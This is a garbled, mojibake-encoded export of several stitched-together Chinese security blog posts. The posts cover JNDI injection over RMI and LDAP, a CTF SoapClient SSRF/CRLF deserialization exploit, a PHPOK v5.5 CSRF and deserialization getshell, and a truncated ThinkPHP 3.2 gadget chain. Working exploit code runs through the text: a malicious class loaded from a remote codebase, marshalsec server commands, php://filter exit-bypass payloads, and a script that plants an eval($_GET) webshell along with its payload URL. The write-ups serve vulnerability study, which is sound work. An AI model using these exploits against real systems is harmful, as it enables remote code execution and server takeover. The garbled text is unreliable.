å³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸ºJRMPï¼ˆJava Remote Message Protocolï¼ŒJavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠCORBAã€‚ ç›¸å½“äºè·¨è¶Šjvmï¼Œè°ƒç”¨ä¸€ä¸ªè¿œç¨‹æ–¹æ³•ã€‚RMIæ˜¯ä¸€ç§è¡Œä¸ºï¼Œå³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ JRMPJavaè¿œç¨‹æ–¹æ³•åè®®ï¼ˆè‹±è¯­ï¼šJava Remote Method Protocolï¼ŒJRMPï¼‰æ˜¯ç‰¹å®šäºJavaæŠ€æœ¯çš„ã€ç”¨äºæŸ¥æ‰¾å’Œå¼•ç”¨è¿œç¨‹å¯¹è±¡çš„åè®®ã€‚è¿™æ˜¯è¿è¡Œåœ¨Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ä¹‹ä¸‹ã€TCP/IPä¹‹ä¸Šçš„çº¿è·¯å±‚åè®®ï¼ˆè‹±è¯­ï¼šWire protocolï¼‰ã€‚ æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåè®®ï¼Œç”¨äºJava RMIè¿‡ç¨‹ï¼ŒåŠŸèƒ½ä¸Šç›¸å½“äºwebè®¿é—®ä¸­çš„httpåè®®ï¼Œåªæœ‰é€šè¿‡ä½¿ç”¨è¯¥åè®®æ‰èƒ½å®ç°RMIè¿œç¨‹æ–¹æ³•è°ƒç”¨ LDAPLDAPï¼ˆLightweight Directory Access Protocolï¼‰-è½»é‡ç›®å½•è®¿é—®åè®®ã€‚æœ¬è´¨ä¸Šç›¸å½“äºä¸€ä¸ªæ•°æ®åº“ï¼Œ JNDIæ³¨å…¥åŸç†JNDIæ”¯æŒå¤šç§æœåŠ¡ç±»å‹ï¼Œå½“æœåŠ¡ç±»å‹ä¸ºRMIåè®®æ—¶ï¼Œå¦‚æœä»RMIæ³¨å†ŒæœåŠ¡ä¸­lookupçš„å¯¹è±¡ç±»å‹ä¸ºReferenceç±»å‹æˆ–å…¶å­ç±»æ—¶ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å› ä¸ºReferenceç±»æä¾›äº†ä¸¤ä¸ªé‡è¦å±æ€§ï¼š 123451.classNameè¿œç¨‹è°ƒç”¨å¼•ç”¨çš„ç±»å2.codebase urlå†³å®šåœ¨è¿›è¡Œrmiè¿œç¨‹è°ƒç”¨æ—¶å¯¹è±¡çš„ä½ç½®ï¼Œcodebase urlæ”¯æŒhttpåè®®ï¼Œå½“é€šè¿‡lookupå¯»æ‰¾çš„è¿œç¨‹è°ƒç”¨ç±»åœ¨RMIæœåŠ¡å™¨çš„CLASSPATHä¸å­˜åœ¨æ—¶å°±ä¼šä»æŒ‡å®šçš„codebase urlè¿›è¡Œç±»çš„åŠ è½½ï¼Œå¦‚æœä¸¤è€…éƒ½æ²¡æœ‰ï¼Œè¿œç¨‹è°ƒç”¨å¤±è´¥ JNDI RCEæ¼æ´äº§ç”ŸåŸå›  1åœ¨lookupçš„æ—¶å€™ï¼Œä¼šä»RMIæ³¨å†Œä¸­å¿ƒä¸‹è½½æ•°æ®ï¼Œç”±äºæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”ï¼Œåªè¦åœ¨Registrationsæ³¨å†Œä¸­å¿ƒæ³¨å†Œä¸€ä¸ªå‘½åå¼•ç”¨ï¼Œå³Referenceï¼Œå®ƒå…·æœ‰ä¸‰ä¸ªå‚æ•°ï¼ŒclassNameã€factoryã€classFactoryLocationã€‚ookupå®ƒå¹¶ä¸‹è½½åˆ°æœ¬åœ°åï¼Œä¼šä½¿ç”¨Referenceçš„classFactoryLocationæŒ‡å®šçš„åœ°å€å»ä¸‹è½½classNameæŒ‡å®šclassæ–‡ä»¶ï¼Œæ¥ç€åŠ è½½å¹¶å®ä¾‹åŒ–ï¼Œè¿™æ ·å°±ä¼šè¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¦‚æœæŠŠæ¶æ„ä»£ç æ”¾åœ¨è¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ä¸­ï¼Œå°±å¯ä»¥è§¦å‘RCEã€‚ JNDI+RMIé€‚ç”¨ç‰ˆæœ¬ï¼šå°äºJDK 6u132, JDK 7u122, JDK 8u113ï¼ˆåŸå› æ˜¯Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ã€‚ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚ï¼‰ æµ‹è¯•jdkç‰ˆæœ¬ 8u101 CIENT.java 123456789101112131415package jndi;import javax.naming.Context;import javax.naming.InitialContext;public class Client { public static void main(String[] args) throws Exception { String uri = &quot;rmi://127.0.0.1:1099/aa&quot;; Context ctx = new InitialContext(); ctx.lookup(uri); }} SERVER.java 123456789101112131415161718package jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;public class SERVER { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(&quot;ExecTest&quot;, &quot;ExecTest&quot;, &quot;http://127.0.0.1:8081/&quot;); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(&quot;Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'&quot;); registry.bind(&quot;aa&quot;, refObjWrapper); }} ExecTest.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;import javax.print.attribute.standard.PrinterMessageFromOperator;public class ExecTest { public ExecTest() throws IOException,InterruptedException{ String cmd=&quot;calc&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { // TODO Auto-generated method stub new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); } public static void main(String[] args) { }} æŠŠç¼–è¯‘å¥½çš„ExecTest.classæ–‡ä»¶æ”¾åˆ°webç›®å½•ä¸‹ å¯ç”¨webæœåŠ¡ 1py -3 -m http.server 8081 åœ¨IDEAé‡Œæ‰§è¡ŒSERVERå’ŒCLIENTï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ JNDI+LDAPé™¤äº†RMIæœåŠ¡å¤–ï¼ŒJNDIè¿˜å¯ä»¥å¯¹æ¥LDAPæœåŠ¡ï¼Œåªéœ€è¦æŠŠlookupçš„åœ°å€æ”¹æˆldap://å³å¯ï¼ŒåŒæ ·å¯ä»¥ä»æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„çš„JNDI Referenceå¯¹è±¡ã€‚ é€‚ç”¨ç‰ˆæœ¬ å°äºJDK 11.0.1ã€8u191ã€7u201ã€6u211ï¼ˆä¹‹åcom.sun.jndi.ldap.object.trustURLCodebaseå±æ€§å€¼è¢«è°ƒæ•´ä¸ºfalseï¼‰ è¿™é‡Œä½¿ç”¨å·¥å…·æ¥æ­å»ºldapæœåŠ¡ç«¯ https://github.com/mbechler/marshalsec å®‰è£…è¿‡ç¨‹ https://www.cnblogs.com/cute-puli/p/14373826.html https://blog.csdn.net/qq_43968080/article/details/105586109 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#ExecTest è·Ÿä¹‹å‰ä¸€æ ·å¼€å¯httpæœåŠ¡å¹¶æŠŠæ¶æ„ç±»classæ–‡ä»¶å¤åˆ¶åˆ°ç›®å½•ä¸‹ CLIENT.java 123456789101112package jndi;import javax.naming.InitialContext;public class Client { public static void main(String[] args) throws Exception { Object object=new InitialContext().lookup(&quot;ldap://192.168.111.129:1389/ExecTest&quot;); }} æ‰§è¡ŒæˆåŠŸ ç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶ç‰ˆæœ¬å¤§äºJDK 11.0.1ã€8u191ã€7u201ã€6u211æ—¶ï¼Œä¹‹å‰è¿™äº›åˆ©ç”¨æ–¹å¼éƒ½å·²ç»å¤±æ•ˆã€‚ä½†æ˜¯ä»ç„¶å¯ä»¥ç»•è¿‡ ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼š 1231.æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚2.åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚ ä¸»è¦ä¾é å—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ï¼Œéœ€è¦åˆ©ç”¨å—å®³è€…æœ¬åœ°çš„Gadgetè¿›è¡Œæ”»å‡»ã€‚ å‚è€ƒï¼š https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/ https://xz.aliyun.com/t/6633 https://www.anquanke.com/post/id/221917#h3-2","link":"/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/"},{"title":"MRCTF2020-EzpopRevenge","text":"ä¸€é“æŒºæœ‰æ„æ€çš„ssrf+crlf+ååºåˆ—åŒ–é¢˜ ä¸‹è½½www.zip /flag.php çœ‹åˆ°$_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;)å°±çŸ¥é“å’Œssrfæœ‰å…³ã€‚æ»¡è¶³æ¡ä»¶åï¼Œflagä¼šè¢«ä¿å­˜åˆ°$_SESSION['flag']ä¸­ ååºåˆ—åŒ–ç‚¹/usr/plugins/HelloWorld/Plugin/Plugin.php ååºåˆ—åŒ–ç‚¹ï¼Œå¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ã€‚å¹¶ä¸”å½“å­˜åœ¨$_REQUEST['admin']æ—¶ï¼Œæ˜¾ç¤º$_SESSION 1C0incid3nc3 /var/Typecho/Plugin.php ååºåˆ—åŒ–SoapClientç±»ååºåˆ—åŒ–SoapClientç±»å¹¶è°ƒç”¨__callæ–¹æ³•å¯ä»¥è§¦å‘ssrf /var/Typecho/Plugin.php åœ¨HelloWorld_DBç±»çš„__wakeupæ–¹æ³•ä¸­å®ä¾‹åŒ–äº†ä¸€ä¸ªTypecho_Dbç±» /var/Typecho/Db.php#Typecho_Db Typecho_Dbç±»çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æç¤º__toString()ï¼Œä¼ å…¥å‚æ•°$adapterNameè¢«å½“ä½œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„ç±»ã€‚ 12å­˜åœ¨__toString()__toStringä¸­å­˜åœ¨å¯ä»¥è§¦å‘SoapClient::__callçš„è¯­å¥ /var/Typecho/Db/Query.php#Typecho_Db_Query Typecho_Db_Queryç±»ç¬¦åˆè¦æ±‚ã€‚é¦–å…ˆæ»¡è¶³æ¡ä»¶ 1$this-&gt;_sqlPreBuild['action']='SELECT' ç„¶åè®©$this-&gt;_adapterç­‰äºSoapClientç±»ï¼Œæ¥ç€è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•parseSelectè§¦å‘__callè¯·æ±‚flag.php æ„é€ expç”±äºSoapClientç±»æ— æ³•ä¼ å…¥Cookieå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨user_agentè¿™é‡ŒåŠ å…¥æ¢è¡Œç¬¦ï¼ˆ\\r\\nï¼‰æ¥æ„é€ å‡ºcookieå‚æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233&lt;?phpclass HelloWorld_DB{ private $coincidence; public function __construct() { $this-&gt;coincidence=['hello'=&gt;new Typecho_Db_Query()]; }}class Typecho_Db_Query{ private $_sqlPreBuild; private $_adapter; public function __construct() { $this-&gt;_sqlPreBuild['action']='SELECT'; $headers = array( &quot;Cookie: PHPSESSID=5j1i9n0jol3vdbpg4m3svbp3n7&quot; ); $this-&gt;_adapter=new SoapClient(null, array( 'location' =&gt; &quot;http://127.0.0.1/flag.php&quot;, 'uri'=&gt; &quot;123&quot;, 'user_agent'=&gt;str_replace(&quot;^^&quot;,&quot;\\r\\n&quot;,'saaaaaa^^'.join('^^',$headers)))); }}$a=serialize(new HelloWorld_DB());echo base64_encode($a); æ‹¿åˆ°flag","link":"/2021/05/14/MRCTF2020-EzpopRevenge/"},{"title":"PHPOK v5.5 csrf+ååºåˆ—åŒ–æ¼æ´getshellåˆ†æ","text":"æ¼æ´å½±å“ç‰ˆæœ¬PHPOK v5.5 æ¼æ´åˆ†æè·¯ç”±è§„åˆ™phpokcmsä»£ç ç»“æ„ï¼Œå…³é”®ä»£ç éƒ½åœ¨frameworkæ–‡ä»¶å¤¹ä¸‹ phpokcmsçš„è·¯ç”±è§„åˆ™æ¯”è¾ƒç®€å•ï¼Œindex.php admin.php api.php åˆ†åˆ«å¯¹åº” frameworkæ–‡ä»¶å¤¹ä¸‹çš„www admin apiè¿™ä¸‰ä¸ªæ–‡ä»¶å¤¹ è¯·æ±‚url 1http://localhost/phpok/admin.php?c=address&amp;f=open å‚æ•°cçš„å€¼æ‹¼æ¥ä¸Š_control.phpå°±æ˜¯å¯¹åº”çš„æ–‡ä»¶ï¼Œå¯¹åº”çš„ç±»å³å‚æ•°cçš„å€¼æ‹¼æ¥ä¸Š_controlï¼Œå¦‚address_control å‚æ•°fçš„å€¼æ‹¼æ¥ä¸Š_få°±æ˜¯å¯¹åº”çš„æ–¹æ³•,å¦‚open_f ](https://imgbed.cn/preview?id=60208e205dc5370001a461a4) å¯åˆ©ç”¨æ¶æ„ç±»æ–‡ä»¶ä½ç½®ï¼š/framework/engine/cache.php __destruct()è°ƒç”¨äº†saveæ–¹æ³•ï¼Œåœ¨saveæ–¹æ³•ä¸­ä½¿ç”¨äº†file_put_contentså‡½æ•°ï¼Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°å‡å¯æ§ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªå‚æ•°å‰é¢æ‹¼æ¥äº†&lt;?php exit();?&gt;ä½¿åé¢çš„phpä»£ç æ— æ³•æ‰§è¡Œ 123456789101112131415161718192021222324252627&lt;?phpclass cache{ public function __destruct() { $this-&gt;save($this-&gt;key_id,$this-&gt;key_list);//è°ƒç”¨save $this-&gt;expired(); } public function save($id,$content='') { if(!$id || $content === '' || !$this-&gt;status){ return false; } $this-&gt;_time(); $content = serialize($content); $file = $this-&gt;folder.$id.&quot;.php&quot;; file_put_contents($file,'&lt;?php exit();?&gt;'.$content); $this-&gt;_time(); $this-&gt;_count(); if($GLOBALS['app']-&gt;db){ $this-&gt;key_list($id,$GLOBALS['app']-&gt;db-&gt;cache_index($id)); } return true; }}?&gt; ç»•è¿‡exit()saveæ–¹æ³•ä¸­ä½¿ç”¨äº†file_put_contentså‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°å‡å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°å‰é¢æ‹¼æ¥äº†&lt;?php exit();?&gt;ä½¿åé¢çš„phpä»£ç æ— æ³•æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡php://filterä¼ªåè®®ä½¿æ‹¼æ¥çš„&lt;?php exit();?&gt;å¤±æ•ˆ æ¥æºäº åŸºäºphp://filteråè®®å¯¹exitå‡½æ•°å‡ ç§é€ƒé€¸æ–¹æ³•çš„åˆ†æ 1.string.strip_tagsè¯¥ç‰¹æ€§ä»PHP 7.3.0èµ·åºŸå¼ƒ &lt;?php exit()?&gt;æœ¬è´¨æ˜¯XMLæ ‡ç­¾ï¼Œå¯ä»¥ä½¿ç”¨strip_tags()å‡½æ•°å»é™¤å®ƒã€‚ä¸ºäº†é˜²æ­¢æˆ‘ä»¬å†™å…¥çš„ä»£ç ä¹Ÿè¢«å»é™¤ï¼Œéœ€è¦æŠŠä»£ç base64ç¼–ç åå†™å…¥ 1234//1.php&lt;?phpfile_put_contents('php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; å°†&lt;?php phpinfo();è¿›è¡Œbase64ç¼–ç åæäº¤ 1http://localhost/test/1.php?a=PD9waHAgcGhwaW5mbygpOw== å†™å…¥æˆåŠŸ 2.base64base64ç¼–ç ç»“æœåªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶(å¦‚&lt;ã€&gt;ã€?ã€;ã€(ã€)ç­‰)ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œå¦‚&lt;?php exit();?&gt;å°±ä¼šå…ˆå˜æˆphpexitå†è¿›è¡Œè§£ç ï¼Œphpexitä¸€å…±7ä¸ªå­—ç¬¦ï¼Œè€Œbase64è§£ç ç®—æ³•æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥å†åœ¨åé¢ä»»æ„æ·»åŠ ä¸€ä½ï¼Œæ¯”å¦‚aï¼Œè¿™æ ·å°±æ˜¯phpexitaå†åœ¨åé¢æ¥ä¸Šä¸€å¥è¯çš„base64ç¼–ç ï¼Œå‰é¢å…«ä½phpexitaè§£ç ç»“æœæ˜¯ä¹±ç ä¸ä¼šè¢«æ‰§è¡Œï¼Œåé¢æ¥ç€è§£ç ä¸€å¥è¯çš„base64ç¼–ç  1234//1.php&lt;?phpfile_put_contents('php://filter/write=convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; æäº¤ 1http://localhost/test/1.php?a=aPD9waHAgcGhwaW5mbygpOw== 3.rot13&lt;?php exit(); ?&gt;åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ&lt;?cuc rkvg(); ?&gt;ï¼Œåœ¨phpä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œ&lt;?php phpinfo();?&gt;ç»è¿‡rot13ç¼–ç åçš„ç»“æœä¸º&lt;?cuc cucvasb();?&gt; æäº¤ 1http://localhost/test/1.php?a=&lt;?cuc cucvasb();?&gt; ååºåˆ—åŒ–ç”±åç§°å¾—çŸ¥decode()ä¸ºè§£å¯†å‡½æ•°ï¼Œencode()ä¸ºåŠ å¯†å‡½æ•°ï¼Œencode()è°ƒç”¨serialize()ï¼Œdecode()ä¸­è°ƒç”¨unserialize()ï¼Œæ‰¾åˆ°è°ƒç”¨decode()å¤„ï¼ŒæŠŠåºåˆ—åŒ–åçš„æ¶æ„ç±»ç”¨encode()åŠ å¯†å†ä½¿ç”¨decode()è§£å¯†å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class token_lib{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid='') { if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config() { if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string) { if(!$this-&gt;keyid){ return false; } $string = serialize($string);//åºåˆ—åŒ– $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + $this-&gt;time)).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } public function decode($string) { if(!$this-&gt;keyid){ return false; } $string = str_replace(' ','+',$string); $keyc = substr($string, 0, $this-&gt;keyc_length); $string = base64_decode(substr($string, $this-&gt;keyc_length)); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); $chkb = substr(md5(substr($rs,26).$this-&gt;keyb),0,16); if((substr($rs, 0, 10) - $this-&gt;time &gt; 0) &amp;&amp; substr($rs, 10, 16) == $chkb){ $info = substr($rs, 26); return unserialize($info);//ååºåˆ—åŒ– } return false; } } encode()å’Œdecode()éƒ½è¦æ±‚keyidï¼Œå…¨å±€æœç´¢å¾—åˆ°keyidæ¥æºäºç®¡ç†å‘˜è®¾ç½®çš„api_code 1$this-&gt;lib('token')-&gt;keyid($this-&gt;site['api_code']); CSRFåœ¨åå°æ‰¾åˆ°APIéªŒè¯ä¸²è®¾ç½®å¤„ æŠ“åŒ…åå‘ç°æ— csrfé˜²æŠ¤ï¼Œæ„é€ è¯·æ±‚è¯±å¯¼ç®¡ç†å‘˜è®¿é—®å³å¯ åˆ©ç”¨æ„é€ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?phpclass cache{ protected $key_id; protected $key_list; protected $folder; public function __construct(){ $this-&gt;key_id = 'shell'; $this-&gt;key_list = 'aa'.base64_encode('&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;'); $this-&gt;folder = 'php://filter/write=convert.base64-decode/resource='; }}class token{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid=''){ if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config(){ if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string){ if(!$this-&gt;keyid){ return false; } $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + time())).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } private function core($string,$cryptkey){ $key_length = strlen($cryptkey); $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); // äº§ç”Ÿå¯†åŒ™ç°¿ for($i = 0; $i &lt;= 255; $i++){ $rndkey[$i] = ord($cryptkey[$i % $key_length]); } // ç”¨å›ºå®šçš„ç®—æ³•ï¼Œæ‰“ä¹±å¯†åŒ™ç°¿ï¼Œå¢åŠ éšæœºæ€§ï¼Œå¥½åƒå¾ˆå¤æ‚ï¼Œå®é™…ä¸Šå¹¶ä¸ä¼šå¢åŠ å¯†æ–‡çš„å¼ºåº¦ for($j = $i = 0; $i &lt; 256; $i++){ $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } // æ ¸å¿ƒåŠ è§£å¯†éƒ¨åˆ† for($a = $j = $i = 0; $i &lt; $string_length; $i++){ $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } return $result; }}$token = new token();$token-&gt;keyid('123456');echo $token-&gt;encode(serialize(new cache));?&gt; è¿è¡Œè„šæœ¬å¾—åˆ°payload ](https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb) åœ¨index_cotrol.phpä¸­çš„phpok_fæ–¹æ³•ä¸­å‘ç°è°ƒç”¨decode æ ¹æ®è·¯ç”±è§„åˆ™è¯·æ±‚url,tokenä¸ºpayload 1http://localhost/phpok/api.php?c=index&amp;f=phpok&amp;token=478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v/RfRV/CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz/vizU53Wfc64OIB/5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU/Czv0n/UXAGlIl+asWwzpz6pMYfHTbIc5Byug4 åˆ©ç”¨æˆåŠŸ å‚è€ƒï¼š https://xz.aliyun.com/t/7852 https://www.ghtwf01.cn/index.php/archives/985/ https://www.ghtwf01.cn/index.php/archives/981/ http://althims.com/2020/02/05/phpok-5-4-173/","link":"/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"},{"title":"ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–å¤ç°","text":"å‚è€ƒ https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect æ­å»ºç¯å¢ƒæ¡†æ¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤æ§åˆ¶å™¨ï¼Œåœ¨é»˜è®¤æ§åˆ¶å™¨ä¸‹æ·»åŠ ä¸€ä¸ªæµ‹è¯•ç”¨çš„Actionå³å¯ã€‚ åˆ†æ1./ThinkPHP/Library/Think/Image/Driver/Imagick.class.php $this-&gt;imgå¯æ§ï¼Œå¯»æ‰¾ç”±destoryæ–¹æ³•çš„ç±» 2./ThinkPHP/Library/Think/Session/Driver/Memcache.class.php destroy()æ–¹æ³•ä¸­è°ƒç”¨delete()æ–¹æ³• ï¼Œ$this-&gt;handleå±æ€§å¯æ§ï¼Œå¯ä¼ å…¥ä»»æ„ç±»å¹¶è°ƒç”¨å®ƒçš„delete()æ–¹æ³•ã€‚destroy()æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ª$sessIDï¼Œä½†æ˜¯å‰é¢è°ƒç”¨destroy()æ²¡æœ‰ä¼ å€¼ï¼Œè€Œ$this-&gt;sessionNameå¯æ§ï¼Œè¿™æ ·æ•´ä¸ªä¼ å…¥çš„å‚æ•°éƒ½å¯æ§ 3./ThinkPHP/Library/Think/Model.class.php $optionsæ•°ç»„ä¸ºä¼ å…¥å‚æ•°ï¼Œå¯æ§ï¼Œå…¶ä»–å±æ€§ä¹Ÿå¯æ§ï¼Œè¿™æ ·åœ¨ä¸¤ä¸ªifè¯­å¥ä¸­å‡ºç°çš„å››ä¸ªæ¡ä»¶éƒ½å¯ä»¥æ»¡è¶³ï¼Œå°±å¯ä»¥ç¬¬äºŒæ¬¡è°ƒç”¨delete()æ–¹æ³•ä¹Ÿå°±æ˜¯è‡ªèº«ï¼Œè€Œè¿™æ¬¡çš„å‚æ•°å˜æˆäº†$this-&gt;data[$pk]ï¼Œå®Œå…¨å¯æ§ã€‚è€Œä¸”é€šè¿‡ä¸‹é¢è¿™æ¡è¯­å¥å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„delete()æ–¹æ³•ã€‚ 1$this-&gt;db-&gt;delete($options); 4./ThinkPHP/Library/Think/Db/Driver.class.php $optionsæ•°ç»„ä¸ºä¼ å…¥å‚æ•°ï¼Œå¯æ§ã€‚å› 